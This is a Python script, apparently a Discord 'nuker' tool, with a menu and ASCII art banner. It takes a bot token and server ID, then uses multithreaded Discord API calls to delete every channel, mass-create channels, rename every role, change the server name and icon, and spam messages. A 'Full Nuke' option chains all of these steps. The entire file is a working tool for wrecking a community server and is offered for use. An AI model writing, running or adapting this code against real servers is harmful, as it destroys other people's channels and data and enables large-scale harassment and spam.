import os
import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Colorate, Center

os.system("title Fucked Server Discord")

ASCII_ART = """
⠀⠀⠠⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⢿⣿⣿⣿⣿⣿⢿⡿⡿⢿⠿⡿⣟⢿⡻⡟⣯⢟
⠀⠀⠐⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠠⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣳⣏⡷⣭⢯⣽⡹⣏⢿⡱⣏⢾⡱⣏⢷⣫
⠀⠀⢈⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⢀⠨⠀⠔⡈⠀⠁⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠳⣮⣿⣼⣷⣾⣷⣿⣾⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠠⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠠⠀⠈⠀⠈⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠐⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠂⠀⡀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠂⢻⣮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⢈⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠂⠀⠄⠀⠀⠀⠡⠻⡽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠰⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠨⢿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⠁⠀⡀⠄⠀⠀⠀⢀⢀⠀⡀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢑⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠄⠀⠀⠠⠀⠀⠠⠴⠀⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⡐⠀⢀⠀⠀⠐⠀⠀⠂⢸⣟⠸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠄⠀⠀⠂⢀⠀⠐⢰⣟⣜⢰⡓⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠂⠀⠀⠀⠀⠀⡀⠸⣻⡼⡞⣸⡳⠤⡑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢞⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⢀⣠⡔⣸⠁⡅⣷⣹⠐⣷⢻⠑⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠲⠋⡠⣢⠏⣨⠆⠻⠈⠈⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠹⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠎⡼⣠⢈⠕⡱⠏⢠⡟⡅⢆⠄⠒⠀⠀⠉⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠿⠿⠿⠿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠆⠀⢱⢂⠩⡝⠣⣴⣿⡙⣜⠀⠠⠀⠀⢀⡼⠇⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⡐⢄⠲⣐⢦⡚⡴⣊⠽⣆⠣⢐⢡⣼⣿⣷⣹⢾⡰⡄⠦⡤⣤⣤⢖⡴⣡⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢂⠁⡂⠔
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⣆⠑⣮⢳⣝⣶⡹⢶⢭⡻⣬⡑⢌⢲⣻⣿⣿⣯⣿⣿⣽⣷⣻⣵⣯⣞⣳⡳⢎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⡀⠃⠌⡐
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⣴⣿⡄⢏⣯⣟⣶⣻⡽⣮⢗⡧⣉⠆⣯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⣶⣤⣅⢂⠐
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢣⠀⠀⠨⢿⣿⣧⠘⡷⣯⣿⣿⡽⣎⠣⣒⠡⣞⣳⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣴⣿⣿⣿⣿⣿⣄
⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣄⠀⠈⢿⣿⣿⣧⠹⣽⣻⣯⣗⢣⠒⣭⣳⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿
⠀⡌⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡝⣿⣦⠀⢩⣿⣿⣿⣦⠁⣷⢹⣬⢣⡏⢳⠛⡜⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣥⢫⣾⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠤⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣾⣝⣦⡀⢞⣿⣿⣿⣧⡀⠃⠎⣎⡔⣂⠖⣠⠄⣍⡽⣶⣾⣿⣿⡿⣿⣿⡿⡝⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⢳⢋⢾⡻⣽⣿⣿⣿⣿⣿⣿⣿
⢈⠆⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣧⡈⢿⣿⣿⣿⣿⣷⣄⠀⠚⠤⠳⠣⠿⠿⠾⠛⠛⠛⠁⣤⡼⣹⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣜⡇⡴⣫⢶⣹⣿⣿⣿⣿⣿⣿⣿⣿
⢌⡜⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡢⠑⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⠀⠠⢄⠈⣀⢀⠠⡀⢜⣸⡏⠃⠁⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⢰⡼⣻⢎⣷⢣⣽⣿⣿⣿⣿⣿⣿⣿⣿
⢎⡼⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣬⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡡⢑⣦⣩⣶⣶⡿⠇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠄⠀⢪⣧⢟⣯⣾⢳⣾⣿⣿⣿⣿⣿⣿⣿⣿
⡺⣜⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡹⠽⣞⡷⠏⢀⠂⠀⡈⠀⠀⠀⠀⠀⠀⠀⠀⢀⢰⣿⣿⡹⣖⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢳⡽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠌⣍⠻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡘⠁⢄⢂⠡⠀⢐⠀⠀⠀⠀⠀⠀⠀⠀⢤⣃⢾⣿⣷⣻⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢿⡥⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡈⠳⣜⢯⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢎⠀⠂⠀⡠⠠⠀⠀⠀⠀⠀⠀⢀⡳⣭⢺⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠜⠻⢶⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠑⠼⠻⠾⠿⣿⢿⣿⣿⣿⣿⡿⡿⠈⠀⠀⠠⠞⠁⠔⠀⠀⠀⠀⠀⠀⠈⠷⠫⠾⣿⢿⣿⡿⣿⡿⢿⡿⣿⣿⠿⡿⢿⣿⣿
"""

API_BASE = "https://discord.com/api/v10"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def startup_sequence():
    clear()
    centered_art = Center.XCenter(ASCII_ART)
    print(Colorate.Horizontal(Colors.red_to_white, centered_art))
    
    print("\n")
    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("coded By 9et! For Any Problem Contact https://guns.lol/.9mt")))
    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("Fucked Discord")))
    print("\n")
    
    global TOKEN
    TOKEN = input(Colorate.Horizontal(Colors.red_to_white, "    Enter Bot Token > ")).strip()
    global GUILD_ID
    global HEADERS
    HEADERS = {
        "Authorization": f"Bot {TOKEN}",
        "Content-Type": "application/json"
    }
    GUILD_ID = input(Colorate.Horizontal(Colors.red_to_white, "    Enter Server ID > ")).strip()
    
    print(Colorate.Horizontal(Colors.red_to_white, "\n    Fucked Server Discord"))
    time.sleep(1)

def print_menu():
    clear()
    centered_art = Center.XCenter(ASCII_ART)
    print(Colorate.Horizontal(Colors.red_to_white, centered_art))
    
    menu_text = """
          [1] Delete Channels          [2] Create Channels          [3] Rename Roles         
          
          [4] Spam Messages            [5] Full Nuke                [0] Exit                 
    """
    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(menu_text)))

def delete_channel(channel_id):
    url = f"{API_BASE}/channels/{channel_id}"
    res = requests.delete(url, headers=HEADERS)
    if res.status_code in [200, 204]:
        print(Colorate.Horizontal(Colors.red_to_white, f"    [+] Deleted channel ID: {channel_id}"))

def delete_all_channels():
    url = f"{API_BASE}/guilds/{GUILD_ID}/channels"
    res = requests.get(url, headers=HEADERS)
    if res.status_code != 200:
        return []
    channels = res.json()
    with ThreadPoolExecutor(max_workers=15) as executor:
        for ch in channels:
            executor.submit(delete_channel, ch["id"])
    return channels

def create_channel(name):
    url = f"{API_BASE}/guilds/{GUILD_ID}/channels"
    payload = {"name": name, "type": 0}
    res = requests.post(url, headers=HEADERS, json=payload)
    if res.status_code == 201:
        print(Colorate.Horizontal(Colors.red_to_white, f"    [+] Created channel: {name}"))
        return res.json().get("id")
    return None

def create_channels(count, base_name):
    created_ids = []
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(create_channel, f"{base_name}-{i}") for i in range(1, count + 1)]
        for f in futures:
            cid = f.result()
            if cid:
                created_ids.append(cid)
    return created_ids

def rename_role(role_id, new_name):
    url = f"{API_BASE}/guilds/{GUILD_ID}/roles/{role_id}"
    payload = {"name": new_name}
    res = requests.patch(url, headers=HEADERS, json=payload)
    if res.status_code == 200:
        print(Colorate.Horizontal(Colors.red_to_white, f"    [+] Renamed role to: {new_name}"))

def rename_all_roles(new_name):
    url = f"{API_BASE}/guilds/{GUILD_ID}/roles"
    res = requests.get(url, headers=HEADERS)
    if res.status_code != 200:
        return
    roles = res.json()
    with ThreadPoolExecutor(max_workers=10) as executor:
        for r in roles:
            if r.get("name") == "@everyone":
                continue
            executor.submit(rename_role, r["id"], new_name)

def update_server_name(new_name):
    url = f"{API_BASE}/guilds/{GUILD_ID}"
    payload = {"name": new_name}
    res = requests.patch(url, headers=HEADERS, json=payload)
    if res.status_code == 200:
        print(Colorate.Horizontal(Colors.red_to_white, f"    [+] Server name changed to: {new_name}"))

def update_server_icon(image_path):
    import base64
    if not os.path.exists(image_path):
        print(Colorate.Horizontal(Colors.red_to_white, "    [-] Image path not found."))
        return
    with open(image_path, "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
    icon_data = f"data:image/png;base64,{encoded_string}"
    url = f"{API_BASE}/guilds/{GUILD_ID}"
    payload = {"icon": icon_data}
    res = requests.patch(url, headers=HEADERS, json=payload)
    if res.status_code == 200:
        print(Colorate.Horizontal(Colors.red_to_white, "    [+] Server icon updated successfully."))

def send_spam_message(channel_id, content):
    url = f"{API_BASE}/channels/{channel_id}/messages"
    payload = {"content": content}
    for _ in range(3):
        requests.post(url, headers=HEADERS, json=payload)

def spam_channels(channel_ids, content):
    if not content or not channel_ids:
        return
    with ThreadPoolExecutor(max_workers=15) as executor:
        for cid in channel_ids:
            executor.submit(send_spam_message, cid, content)

def main():
    startup_sequence()
    while True:
        print_menu()
        choice = input(Colorate.Horizontal(Colors.red_to_white, "\n    Select Option > ")).strip()

        if choice == "0":
            sys.exit()

        elif choice == "1":
            print(Colorate.Horizontal(Colors.red_to_white, "\n    [!] Deleting all channels..."))
            delete_all_channels()
            input(Colorate.Horizontal(Colors.red_to_white, "\n    Done. Press Enter to continue..."))

        elif choice == "2":
            try:
                name = input(Colorate.Horizontal(Colors.red_to_white, "    Enter Channel Name > ")).strip()
                count = int(input(Colorate.Horizontal(Colors.red_to_white, "    Enter Channel Count > ")).strip())
                create_channels(count, name)
            except ValueError:
                print(Colorate.Horizontal(Colors.red_to_white, "    [-] Invalid number entered."))
            input(Colorate.Horizontal(Colors.red_to_white, "\n    Done. Press Enter to continue..."))

        elif choice == "3":
            role_name = input(Colorate.Horizontal(Colors.red_to_white, "    Enter New Role Name > ")).strip()
            rename_all_roles(role_name)
            input(Colorate.Horizontal(Colors.red_to_white, "\n    Done. Press Enter to continue..."))

        elif choice == "4":
            url = f"{API_BASE}/guilds/{GUILD_ID}/channels"
            res = requests.get(url, headers=HEADERS)
            if res.status_code == 200:
                channels = [c["id"] for c in res.json() if c.get("type") == 0]
                spam_text = input(Colorate.Horizontal(Colors.red_to_white, "    Enter Spam Message > ")).strip()
                if spam_text:
                    spam_channels(channels, spam_text)
            input(Colorate.Horizontal(Colors.red_to_white, "\n    Done. Press Enter to continue..."))

        elif choice == "5":
            try:
                new_server_name = input(Colorate.Horizontal(Colors.red_to_white, "    New Name Server > ")).strip()
                image_path = input(Colorate.Horizontal(Colors.red_to_white, "    Path to Server Icon (Logo) > ")).strip()
                new_channel_name = input(Colorate.Horizontal(Colors.red_to_white, "    New Name Channels > ")).strip()
                channel_count = int(input(Colorate.Horizontal(Colors.red_to_white, "    Enter Channel Count > ")).strip())
                new_role_name = input(Colorate.Horizontal(Colors.red_to_white, "    New Name Roles > ")).strip()
                spam_text = input(Colorate.Horizontal(Colors.red_to_white, "    Spam Message Content > ")).strip()

                print(Colorate.Horizontal(Colors.red_to_white, "\n    [!] Executing Full Nuke Sequence..."))
                update_server_name(new_server_name)
                update_server_icon(image_path)
                delete_all_channels()
                rename_all_roles(new_role_name)
                new_ids = create_channels(channel_count, new_channel_name)
                
                if spam_text:
                    spam_channels(new_ids, spam_text)

            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_white, f"    [-] Error: {e}"))
            
            input(Colorate.Horizontal(Colors.red_to_white, "\n    Done. Press Enter to continue..."))

if __name__ == "__main__":
    main()